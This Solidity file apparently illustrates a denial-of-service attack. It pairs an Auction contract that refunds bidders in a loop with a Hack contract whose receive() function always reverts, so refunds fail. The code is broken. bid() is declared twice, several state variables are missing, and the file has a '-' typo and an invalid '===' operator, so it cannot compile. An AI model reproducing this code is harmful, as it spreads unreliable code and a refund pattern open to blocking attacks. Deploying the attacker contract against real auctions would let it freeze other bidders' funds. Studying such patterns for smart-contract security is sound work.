// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

contract Auction {
  function bid() external payable {
    bids[msg.sender] += msg.value;
    bidders.push(msg.sender);
  }

  function bid() external payable {
    bids[msg.sender] += msg.value;
    bidders.push(msg.sender);
  }

  function refund() external {
    for(uint i = 0; i < bidders.length; ++i) {
      address currentBidder - bidders[i];
      uint refundAmount = bids[currentBidder];

      bids[currentBidder] = 0;

      if(refundAmount > 0) {
        (bool ok,) = currentBidder.call{value: refundAmount}("");
        // require(ok, "can't send");
        if (!ok) {

        }
      }
    }
  }
}

contract Hack {
  Auction toHack;
  uint constant BID_AMOUNT = 100;

  constructor(address _toHack) payable {
    require(msg.value === BID_AMOUNT);

    toHack = Auction(_toHack);
    toHack.bid{value: msg.value}();
  }

  function disableHacking() external {
    isHackingEnabled = false;
  }

  receive() external payable {
    if (isHackingEnabled) {
      assert(false);
    }
  }
}

